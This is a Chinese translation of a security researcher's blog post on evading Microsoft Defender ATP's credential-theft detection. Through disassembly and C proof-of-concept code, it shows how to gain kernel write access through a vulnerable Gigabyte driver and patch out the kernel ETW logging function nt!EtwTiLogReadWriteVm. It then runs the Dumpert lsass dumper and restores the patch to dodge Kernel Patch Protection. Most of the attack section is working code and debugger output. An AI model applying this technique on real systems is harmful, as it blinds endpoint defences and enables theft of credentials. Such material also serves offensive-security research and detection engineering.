
# 如何规避Windows Defender ATP


                                阅读量   
                                **675037**
                            
                        |
                        
                                                                                                                                    ![](./img/199919/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者b4rtik，文章来源：b4rtik.github.io
                                <br>原文地址：[https://b4rtik.github.io/posts/evading-windefender-atp-credential-theft-kernel-version/](https://b4rtik.github.io/posts/evading-windefender-atp-credential-theft-kernel-version/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/199919/t010074be4d1c51cfd2.jpg)](./img/199919/t010074be4d1c51cfd2.jpg)



## 0x00 前言

几星期之前，我和[uf0](https://twitter.com/matteomalvica)花了点时间研究了一下Windows Defender ATP的凭据防窃取功能，官方说明中有一段话引起了我们的注意：

> （ATP）采用了一种统计学方法来检测凭据窃取行为。回顾已有的多款工具，我们发现凭据窃取行为与`lsass.exe`进程内存的读取次数及读取数据量密切相关，非常有可能正确预测。

我们准备从Ring3开始研究，然而即便我们找到了能够规避这种控制策略的方法，也没有在`NtReadVirtualMemory`中看到任何hook。因此我们决定研究一下`NtReadVirtualMemory`内部的工作原理。



## 0x01 Dumpert vs ATP

[Dumpert](https://github.com/outflanknl/Dumpert)是用来转储lsass进程内存的一款工具，该工具直接使用syscall，没有hook原生API，从而实现AV及EDR控制策略的规避。虽然这种方法对基于API hook的检测机制非常有效，但依然无法规避MDATP的检测。

[![](./img/199919/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019b91108653e8f86b.png)

在[uf0](https://twitter.com/matteomalvica)小伙伴的帮助下，我们研究了MDATP的逻辑，发现了在用户模式下的一种方法，可以规避之前ATP对`PssCaptureSnapshot` API利用技术的防护。在研究过程中，至少在用户模式下我们没有找到ATP设置的任何hook或者其他痕迹。因此有理由推测ATP是在Ring0检测恶意行为。



## 0x02 ReadVirtualMemory

Dumpert这款工具基于`MiniDumpWriteDump`函数构建，而该函数又基于`NtReadVirtualMemory`。因此即使没有hook，这款工具实际执行的代码如下所示：

```
0:002&gt; uf ntdll!NtReadVirtualMemory
ntdll!NtReadVirtualMemory:
00007fff`11e5c890 4c8bd1          mov     r10,rcx
00007fff`11e5c893 b83f000000      mov     eax,3Fh
00007fff`11e5c898 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007fff`11e5c8a0 7503            jne     ntdll!NtReadVirtualMemory+0x15 (00007fff`11e5c8a5)  Branch

ntdll!NtReadVirtualMemory+0x12:
00007fff`11e5c8a2 0f05            syscall
00007fff`11e5c8a4 c3              ret

ntdll!NtReadVirtualMemory+0x15:
00007fff`11e5c8a5 cd2e            int     2Eh
00007fff`11e5c8a7 c3              ret
```

syscall将上下文环境从用户模式转移到内核模式。如果我们深入分析`nt!NtReadVirtualMemory`的实现，会发现其内部会调用另一个函数：`nt!MiReadWriteVirtualMemory`。

```
lkd&gt; uf nt!NtReadVirtualMemory
nt!NtReadVirtualMemory:
fffff801`25a22a80 4883ec38        sub     rsp,38h
fffff801`25a22a84 488b442460      mov     rax,qword ptr [rsp+60h]
fffff801`25a22a89 c744242810000000 mov     dword ptr [rsp+28h],10h
fffff801`25a22a91 4889442420      mov     qword ptr [rsp+20h],rax
fffff801`25a22a96 e815000000      call    nt!MiReadWriteVirtualMemory (fffff801`25a22ab0)
fffff801`25a22a9b 4883c438        add     rsp,38h
fffff801`25a22a9f c3              ret
```

在最近的Windows版本中，系统在读取目标内存之前内核首先会检查函数调用是否来自于用户模式，以避免该调用读取受保护进程或者内核地址空间。如下所示，除了这些检查操作外，系统还会调用`nt!EtwTiLogReadWriteVm`。因此，为了记录该事件，ATP会使用Etw来记录`nt!NtReadVirtualMemory`。

```
lkd&gt; uf nt!MiReadWriteVirtualMemory
.
.
.

nt!MiReadWriteVirtualMemory+0x1ce:
fffff801`25a22c7e 48897c2428      mov     qword ptr [rsp+28h],rdi
fffff801`25a22c83 4c89642420      mov     qword ptr [rsp+20h],r12
fffff801`25a22c88 448bca          mov     r9d,edx
fffff801`25a22c8b 4d8bc6          mov     r8,r14
fffff801`25a22c8e 498bd2          mov     rdx,r10
fffff801`25a22c91 8bce            mov     ecx,esi
fffff801`25a22c93 ebe8e8f70200      call    nt!EtwTiLogReadWriteVm (fffff801`25a52480)
fffff801`25a22c98 eb90            jmp     nt!MiReadWriteVirtualMemory+0x17a (fffff801`25a22c2a) 
.
.
.
```

```
lkd&gt; uf nt!EtwTiLogReadWriteVm
nt!EtwTiLogReadWriteVm:
fffff801`25a52480 48895c2420      mov     qword ptr [rsp+20h],rbx
fffff801`25a52485 894c2408        mov     dword ptr [rsp+8],ecx
fffff801`25a52489 55              push    rbp
fffff801`25a5248a 56              push    rsi
fffff801`25a5248b 57              push    rdi
.
.

nt!EtwTiLogReadWriteVm+0x175667:
.
.
.
fffff801`25bc7b4d e8161796ff      call    nt!EtwpTiFillProcessIdentity (fffff801`25529268)
fffff801`25bc7b52 4403c8          add     r9d,eax
fffff801`25bc7b55 488d8db0000000  lea     rcx,[rbp+0B0h]
fffff801`25bc7b5c 418bc1          mov     eax,r9d
fffff801`25bc7b5f ba08000000      mov     edx,8
fffff801`25bc7b64 4803c0          add     rax,rax
fffff801`25bc7b67 41ffc1          inc     r9d
fffff801`25bc7b6a 4533c0          xor     r8d,r8d
fffff801`25bc7b6d 8364c44c00      and     dword ptr [rsp+rax*8+4Ch],0
fffff801`25bc7b72 48894cc440      mov     qword ptr [rsp+rax*8+40h],rcx
fffff801`25bc7b77 488d8db8000000  lea     rcx,[rbp+0B8h]
fffff801`25bc7b7e 8954c448        mov     dword ptr [rsp+rax*8+48h],edx
fffff801`25bc7b82 418bc1          mov     eax,r9d
fffff801`25bc7b85 4803c0          add     rax,rax
fffff801`25bc7b88 8364c44c00      and     dword ptr [rsp+rax*8+4Ch],0
fffff801`25bc7b8d 48894cc440      mov     qword ptr [rsp+rax*8+40h],rcx
fffff801`25bc7b92 41ffc1          inc     r9d
fffff801`25bc7b95 488b0de4d0c6ff  mov     rcx,qword ptr [nt!EtwThreatIntProvRegHandle (fffff801`25834c80)]
fffff801`25bc7b9c 8954c448        mov     dword ptr [rsp+rax*8+48h],edx
fffff801`25bc7ba0 488d442440      lea     rax,[rsp+40h]
fffff801`25bc7ba5 488bd3          mov     rdx,rbx
fffff801`25bc7ba8 4889442420      mov     qword ptr [rsp+20h],rax
fffff801`25bc7bad e8ce0e8aff      call    nt!EtwWrite (fffff801`25468a80)
fffff801`25bc7bb2 90              nop
fffff801`25bc7bb3 e939a9e8ff      jmp     nt!EtwTiLogReadWriteVm+0x71 (fffff801`25a524f1)  Branch
```



## 0x03 修改内核

现在我们已经知道系统对内存读取操作的告警点，那么能不能找到办法，避免ATP通过Etw检测到Dumpert的执行呢？比如，如果我们能patch内核，在`nt! EtwTiLogReadWriteVm`函数开头处插入一个`RET`，那么就能绕过任何记录行为。在内核patch方面，我们只需要能够在Ring3写入内核内存空间即可。在开发PoC时，我们最初想自己开发一个可用的驱动。然后我突然想起跟Cn33liz的一次讨论，当时小伙伴提示我们可以通过存在漏洞的驱动在Ring0执行代码。根据[Cn33liz](https://twitter.com/Cneelis)的提示，我们可以选择Gigabyte的漏洞驱动来实现本地提权，这方面内容大家可以参考&lt;a href=”https://medium.com/[@fsx30](https://github.com/fsx30)/weaponizing-vulnerable-driver-for-privilege-escalation-gigabyte-edition-e73ee523598b”&gt;这篇文章，其中详细分析了如何提权，以及如何移除进程保护模式（Process Protect Mode）。一旦我们具备内核模式的读写权限，我们还需要寻找特征点。在Windows 10 1909上，我们可以寻找如下特征：

```
fffff804`0e45291c 4183f910        cmp     r9d,10h
fffff804`0e452920 b800000c00      mov     eax,0C0000h
fffff804`0e452925 41b800000300    mov     r8d,30000h

```

然后使用windbg，检查该特征是否具备唯一性：

```
lkd&gt; s -[1]b nt L0x1000000 41 83 f9 10 b8 00 00 0c 00 41 b8 00 00 03 00
0xfffff804`0e45291c
```

然后计算偏移量：

```
lkd&gt; ? fffff804`0e45291c - nt!EtwTiLogReadWriteVm
Evaluate expression: 76 = 00000000`0000004c
```

为了获取内核的基址，我们可以使用`NtQuerySystemInformation`，将`NtQuerySystemInformation`传入`SystemInformationClass`参数。

```
cif (!NT_SUCCESS(status = NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, 1024 * 1024, NULL)))
{
  printf("\nError: Unable to query module list (%#x)\n", status);

  VirtualFree(ModuleInfo, 0, MEM_RELEASE);
  return -1;
}
```

然后遍历已加载的模块，寻找`ntoskrnl.exe`，将patch应用到前面windbg计算出的偏移量：

```
for (i = 0; i &lt; ModuleInfo-&gt;NumberOfModules; i++)
{
    if (strcmp((char *)(ModuleInfo-&gt;Modules[i].FullPathName + ModuleInfo-&gt;Modules[i].OffsetToFileName), "ntoskrnl.exe") == 0)
    {
    printf("[+] Kernel address: %#x\n", ModuleInfo-&gt;Modules[i].ImageBase);

    uintptr_t pml4 = find_directory_base(ghDriver);
    printf("\n");

    BOOL result = read_virtual_memory(ghDriver, pml4, (uintptr_t)ModuleInfo-&gt;Modules[i].ImageBase, buffer, searchlen);
    if(result)
    {
        DWORD offset = searchSign((unsigned char*)buffer, signature, sizeof(signature));
        free(buffer);
        printf("[*] Offset %d\n", offset - backoffset);

        patchFunction(ModuleInfo-&gt;Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm");

        printf("[+] Run your command now\n");

        int retCode = system(argv[1]);

        printf("\n\n");
            printf("[+] Execution finished with exit code: %d\n", retCode);
    }
    else
    {
        printf("[*] Errore reading kernel memory \n");
    }
    }
}
```

当我们第一次执行PoC时，我们以为能看到成功结果，或者遇到BSOD，然而结果却比较尴尬。我们的工具成功patch，并且执行Dumpert也没有触发警报，然而在几分钟后，目标主机开始重启。通过事件查看器，我们发现了Kernel Patch Protection（内核补丁保护，KPP）的身影（EventData 0x00000109）。

KPP会定期执行检查，确保内核中受保护的系统结构没被篡改。如果检测到不一致，那么将出现蓝屏以及/或者重新启动。

我们的目标并非绕过KPP，但至少要限制BSOD出现的几率。经测试后，我们发现每隔5到10分钟，KPP的检测机制就会发现我们的patch操作，我们的执行时间只有几秒钟。因此我们改进了思路，只有在必要的时候再patch内核，执行完毕后再恢复初始状态。大家可以参考[此处](https://gist.github.com/b4rtik/daefa2b3d9c99d825e354f4d32ec9927)的部分源代码。

```
for (i = 0; i &lt; ModuleInfo-&gt;NumberOfModules; i++)
{
    if (strcmp((char *)(ModuleInfo-&gt;Modules[i].FullPathName + ModuleInfo-&gt;Modules[i].OffsetToFileName), "ntoskrnl.exe") == 0)
    {
    printf("[+] Kernel address: %#x\n", ModuleInfo-&gt;Modules[i].ImageBase);

    uintptr_t pml4 = find_directory_base(ghDriver);
    printf("\n");

    BOOL result = read_virtual_memory(ghDriver, pml4, (uintptr_t)ModuleInfo-&gt;Modules[i].ImageBase, buffer, searchlen);
    if(result)
    {
        DWORD offset = searchSign((unsigned char*)buffer, signature, sizeof(signature));
        free(buffer);
        printf("[*] Offset %d\n", offset - backoffset);

        BYTE EtwTiLogReadWriteVmOri = patchFunction(ModuleInfo-&gt;Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm");

        printf("[+] Run your command now\n");

        int retCode = system(argv[1]);

        printf("\n\n");
            printf("[+] Execution finished with exit code: %d\n", retCode);
        printf("[+] Proceed to restore previous state.\n");

        patchFunction(ModuleInfo-&gt;Modules[i].ImageBase, pml4, offset - backoffset, "EtwTiLogReadWriteVm", EtwTiLogReadWriteVmOri);
    }
    else
    {
        printf("[*] Errore reading kernel memory \n");
    }
    }
}
```



## 0x04 总结

根据我们的观察，系统不能及时捕捉到我们的修改操作，我们可以通过单字节patch实现绕过效果。MDATP的检测机制远不止这个传感器，而我们通过较为粗暴的方式直接禁用掉其跟踪机制。我们比较好奇的是，为什么存在漏洞的这个驱动依然可以在操作系统中使用。
